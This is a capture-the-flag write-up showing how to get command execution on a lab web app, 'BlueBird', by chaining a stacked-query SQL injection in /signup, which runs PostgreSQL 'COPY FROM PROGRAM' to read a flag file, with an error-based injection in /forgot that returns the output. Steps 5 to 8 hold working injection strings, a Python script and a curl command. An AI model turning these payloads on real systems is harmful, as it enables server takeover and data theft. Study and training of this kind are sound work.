---
tags: [writeup, pentest-report, how-to, recon-value-assessment]
companion_to: tests/reading_writing_files_writeup.md, tests/error_based_sqli_writeup.md
last_updated: 2026-07-05
---

# How-To: Command Execution via SQL Injection in BlueBird

I was assigned this task: use any of BlueBird's known SQL injection points
(`10.129.204.249:8080`) to get actual command execution on the server, and
prove it by reading `/var/lib/postgresql/13/main/flag.txt`. Unlike every
earlier engagement, this one didn't need much new investigation at all —
both injection points involved here were already fully worked out in
previous engagements this session. The interesting part was combining them.
The result: `HTB{f9141e0c21d27c56cfdb812960d4e7c3}`.

You'll need Python with `requests`, or `curl`.

## Step 1 — Check what's already known, and notice there's almost nothing new to look up

**Why:** same first move as every engagement — check recon before doing
anything. This time it was less about *finding* something new and more
about confirming I already had everything I needed:

```bash
sqlite3 -header -column data/recon.db "SELECT finding_id, endpoint, vuln_class FROM findings;"
```
```
finding_id  endpoint       vuln_class
----------  -------------  ---------------
1           /signup        sql_injection
3           /forgot        error_based
5           /signup        stacked_queries
```

Two things were already confirmed, in earlier work this session: `/signup`
lets me run more than one SQL statement per request (a previous engagement
used this to make the database write an arbitrary file), and `/forgot` lets
me read arbitrary values back out of the database one request at a time,
through a database error message. Command execution didn't need a new
injection point — it needed combining these two in a way neither earlier
engagement had reason to.

## Step 2 — Recall exactly how the multi-statement trick works, since I'm about to add a new kind of statement to it

**Why:** the mechanism (from earlier work): `/signup`'s database call is
made with a single unparameterized SQL string, which lets PostgreSQL treat
a semicolon inside my input as the start of a whole new statement. Last
time, that second statement was `COPY ... TO 'file'` — write a file.
PostgreSQL has a close relative of that command that does something very
different: `COPY table FROM PROGRAM 'shell command'` runs an actual shell
command on the server and pipes whatever it prints back into a database
table, as if it were the contents of a file being imported. That's real
command execution, expressed as an ordinary SQL statement.

Worth checking before relying on it: does the database account BlueBird
connects with actually have permission to do this? (Running arbitrary
programs from SQL normally requires elevated database privileges.) I
already had indirect evidence it might: the earlier file-write engagement
against this exact target succeeded, and writing files server-side needs
similar elevated privilege. Still, I confirmed it directly against a
disposable local copy before trying it for real (Step 6).

## Step 3 — Work out how I'll actually see the command's output

**Why this needed real thought:** running a command is only half the
problem — `/signup` has no way to show me anything back. It's a
one-way street: submit a signup, get redirected, done. Whatever the
command prints has to land somewhere I can actually read it. The answer:
land it in a temporary database table, then read that table's contents
using the *other* already-proven technique — `/forgot`'s error-based
oracle, which can already read an arbitrary value out of the database and
show it to me directly in an error message. Two separate, already-solved
problems, put together: `/signup` to run the command and store its output;
`/forgot` to read that output back out.

## Step 4 — Check what the automated tooling makes of this, and notice a real gap

**Why:** both `/signup` and `/forgot` already have solid, real evidence on
file from earlier engagements — this is the first time in this session
*two* separate candidates were both already this well-characterized at
once. Worth checking what that actually buys me automatically.

Real result: the automated exploitation tool can build a complete, correct
command for either one *individually* — same as the previous engagement.
But there's nothing anywhere in this toolchain that understands "run this
command through candidate A, then read the result back through completely
unrelated candidate B." Each candidate is still just one endpoint, one
parameter, one request shape. Chaining two different vulnerabilities'
results together like this is squarely a person's job — recognizing that
two already-solved problems can be composed into a new capability isn't
something any automated evidence file captures.

## Step 5 — Prove the mechanism works, before trying it against the real target

**Why:** exactly the same caution as the file-write engagement — test
locally first, on a disposable copy, before spending live requests on
something that might be subtly wrong.

Directly against a local test database, to check the account even has the
right privilege at all:
```sql
CREATE TABLE cmdout_test(t text);
COPY cmdout_test FROM PROGRAM 'echo hello_from_program';
SELECT * FROM cmdout_test;
```
Real result: `hello_from_program` — confirmed the privilege exists before
ever going through the application.

Then through the actual `/signup` form, using the same injection shape as
the file-write engagement (a complete, valid `INSERT` first, so the whole
batch doesn't abort, then the real payload):
```
name = x','cetest1','cetest1@y.com','y'); CREATE TABLE cmdout_ce1(t text); COPY cmdout_ce1 FROM PROGRAM 'echo hello_from_ce_test'; --
```
Real result: "Account was created" (no visible error) — then, checking the
database directly, the table really did contain `hello_from_ce_test`.
Reading it back through `/forgot`'s oracle instead of checking the database
directly:
```
email = x' OR 1=CAST((SELECT t FROM cmdout_ce1 LIMIT 1) AS int)-- @a.com
```
Real result: `invalid input syntax for type integer: "hello_from_ce_test"`
— the whole chain, both ends, confirmed working before ever touching the
real target.

## Step 6 — Run the real command against the real target

```python
import requests

name_payload = (
    "x','cetester2','cetester2@y.com','y'); "
    "CREATE TABLE flagcap1(t text); "
    "COPY flagcap1 FROM PROGRAM 'cat /var/lib/postgresql/13/main/flag.txt'; --"
)

r = requests.post("http://10.129.204.249:8080/signup", data={
    "name": name_payload,
    "username": "cetester2",
    "email": "cetester2@test.local",
    "password": "CeTesterPass123",
    "repeatPassword": "CeTesterPass123",
}, allow_redirects=False)
print(r.status_code, r.headers.get("Location"))
```

Real result: `302  http://10.129.204.249:8080/login?e=Account+was+created`
— same unremarkable success message as any normal signup, with the flag's
own file contents now sitting in a table on the server, waiting to be read.

## Step 7 — Read the result back through the other endpoint

```bash
curl -s -X POST http://10.129.204.249:8080/forgot \
  --data-urlencode "email=x' OR 1=CAST((SELECT t FROM flagcap1 LIMIT 1) AS int)-- @a.com"
```

Real result:
```
invalid input syntax for type integer: "HTB{f9141e0c21d27c56cfdb812960d4e7c3}"
```

**The flag: `HTB{f9141e0c21d27c56cfdb812960d4e7c3}`.**

## Step 8 — Clean up

**Why:** the temporary table has no reason to stay around once I have what
I need from it.

```python
name_payload = "x','cetester3','cetester3@y.com','y'); DROP TABLE flagcap1; --"
# ...submitted the same way as Step 6
```

## Step 9 — What this engagement showed about recon's value, specifically

This one had the smallest gap yet between "what recon already knew" and
"what actually solved the task" — genuinely, almost nothing new needed
discovering, since both halves of the chain were already fully proven in
earlier work. That's worth stating plainly rather than treating as a
letdown: it's exactly the payoff prior recon is supposed to produce on a
real, multi-week engagement — the tenth time you touch an application
should be faster than the first, because the groundwork is already done.
What genuinely still required a person, even with both pieces already
solved individually, was recognizing they could be *combined* — running a
command through one already-known injection point and reading its result
back through a completely different one is a step of creative synthesis no
automated evidence file expresses on its own, no matter how well either
half is already characterized.
